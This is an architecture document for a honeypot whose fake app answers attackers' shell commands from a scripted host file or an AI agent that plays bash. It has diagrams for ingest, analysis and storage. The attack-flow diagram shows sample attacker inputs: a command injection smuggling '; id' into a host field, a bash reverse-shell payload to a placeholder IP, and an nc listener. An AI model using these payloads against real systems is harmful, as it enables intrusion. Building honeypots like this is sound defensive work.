# HoneyStack architecture

The attacker exploits a fake app on Akash and gets a "reverse shell". Every command they type is answered by the control server: common commands from a fixed fake host (`world.json`), everything else by a Guild agent playing bash. The control server is the only thing that writes to ClickHouse. A second Guild agent turns a session into a playbook summary for the dashboard.

## 1. System overview

```mermaid
flowchart LR
  subgraph ATT["Attacker"]
    A1["Browser / curl"]
    A2["nc -lvnp 4444<br/>(public listener)"]
  end

  subgraph AK["Akash"]
    T["Trap<br/>apps/trap/server.mjs<br/>fake Acme Status app"]
  end

  subgraph CS["Control server :8080 (apps/control/server.ts)"]
    ING["Ingest<br/>/v1/events/batch<br/>ingest.mjs (C)"]
    SB["Shell brain<br/>/v1/shell/*<br/>shell-brain.ts (B)"]
    FP["Fast path<br/>packages/shell/world.json"]
    FL["Character filter"]
    AN["Analyst API<br/>/v1/analyze<br/>guild.ts (E)"]
  end

  subgraph GU["Guild (workspace evanb~honeystack)"]
    GS["honeystack-shell<br/>plays bash<br/>one session per attacker"]
    GA["honeystack-analyst<br/>playbook summary"]
  end

  CH[("ClickHouse<br/>honeypot.events<br/>honeypot.shell_turns")]
  D["Dashboard (D)<br/>timeline, terminal replay,<br/>time wasted, Analyze"]

  A1 -- "HTTP: recon, leaked token,<br/>; id injection, reverse-shell payload" --> T
  T -- "real TCP callback<br/>(CALLBACK_ALLOWLIST only)" --> A2
  T -- "every request<br/>(Bearer INGEST_TOKEN)" --> ING
  T -- "each typed command" --> SB
  SB --> FP
  SB -- "commands the fast path can't answer" --> GS
  GS -- "reply (runtime_done event)" --> FL
  FL --> SB
  ING -- "insertEvents()" --> CH
  SB -- "insertShellTurn()<br/>+ guild_session_id / guild_event_id" --> CH
  D -- "listSessions, getTimeline, getTurns" --> CH
  D -- "Analyze (CONTROL_TOKEN)" --> AN
  AN -- "getTimeline + getTurns" --> CH
  AN -- "evidence (untrusted)" --> GA
  GA -- "JSON summary" --> AN
  AN -. "result shown on dashboard<br/>(in memory; analyses table not built yet)" .-> D
```

## 2. One attack, start to finish

```mermaid
sequenceDiagram
  autonumber
  actor Atk as Attacker
  participant L as nc listener
  participant T as Trap (Akash)
  participant C as Control server
  participant G as Guild honeystack-shell
  participant CH as ClickHouse

  Atk->>T: GET /api/env
  T->>C: POST /v1/events/batch
  C->>CH: INSERT events
  T-->>Atk: leaked ADMIN_TOKEN (synthetic)

  Atk->>T: POST /api/admin/diagnostics {"host":"8.8.8.8#59; id"}
  T->>C: /v1/shell/oneshot "id"
  C-->>T: uid=1000(node)... (fast path)
  T-->>Atk: fake ping output + uid=1000(node)

  Atk->>T: POST diagnostics {"host":"x#59; bash -i >#38; /dev/tcp/IP/4444 0>#38;1"}
  T->>C: /v1/shell/open
  C->>G: start session + machine description
  G-->>C: READY
  T->>L: TCP connect (allowlisted IP)
  T-->>L: bash banner + node@acme-status-7f9c4:/app$

  loop every command
    L->>T: command (e.g. find / -perm -4000)
    T->>C: /v1/shell/cmd
    alt fast path (id, ls, cat, cd, sudo -l, curl, psql...)
      C->>C: answer from world.json + session state
    else everything else
      C->>G: follow-up message: session_state + command
      G-->>C: raw terminal output
      C->>C: character filter
    end
    C->>CH: INSERT shell_turns (served_by, guild ids)
    C-->>T: output + prompt + delay
    T-->>L: output + prompt
  end
```

## 3. Analysis (the reveal)

```mermaid
sequenceDiagram
  autonumber
  actor Op as Presenter
  participant D as Dashboard
  participant C as Control server (guild.ts)
  participant CH as ClickHouse
  participant GA as Guild honeystack-analyst

  Op->>D: click Analyze on a session
  D->>C: POST /v1/analyze {session_id} (CONTROL_TOKEN)
  C->>CH: getTimeline + getTurns (up to 20 events, 40 turns)
  C->>GA: api_trigger session: evidence marked untrusted
  C-->>D: 202 {analysis id, guild_session_url}
  loop poll
    C->>GA: GET session events (runtime_done?)
  end
  GA-->>C: JSON: classification, summary, playbook stages, evidence ids
  C->>C: validate schema + every evidence id belongs to the session
  D->>C: GET /v1/analysis/:id
  C-->>D: result + time_wasted_seconds + Guild link
```

## 4. What ClickHouse stores

```mermaid
erDiagram
  EVENTS {
    UUID event_id
    UUID session_id
    DateTime64 received_at
    string method
    string route
    string payload_text "redacted, bounded"
    string response_template "e.g. diag-injected, revshell-callback"
    string origin_label "synthetic_fixture | live_demo"
  }
  SHELL_TURNS {
    UUID turn_id
    UUID session_id
    UInt32 seq
    DateTime64 received_at
    string command
    string output "exactly what the attacker saw"
    string cwd
    string served_by "fast_path | guild | llm | filter"
    string guild_session_id "sql/003"
    string guild_event_id "sql/003"
    UInt32 latency_ms
  }
  EVENTS }o--o{ SHELL_TURNS : "same session_id"
```

**Notes**
- Guild never touches ClickHouse; the control server is the only writer. Guild's own transcript and token usage stay in Guild, linked by `guild_session_id`.
- Without `CLICKHOUSE_URL`, the control server runs in dev mode and writes `data/events.jsonl` and `data/shell_turns.jsonl` instead.
- `SHELL_BACKEND=anthropic` replaces the Guild shell agent with direct Claude API calls (same filter, same rows, `served_by: llm`).
- Analyst results are in memory only until an `analyses` table is added (`docs/clickhouse-plan.md` §2.5, hook: `setAnalysisSink`).
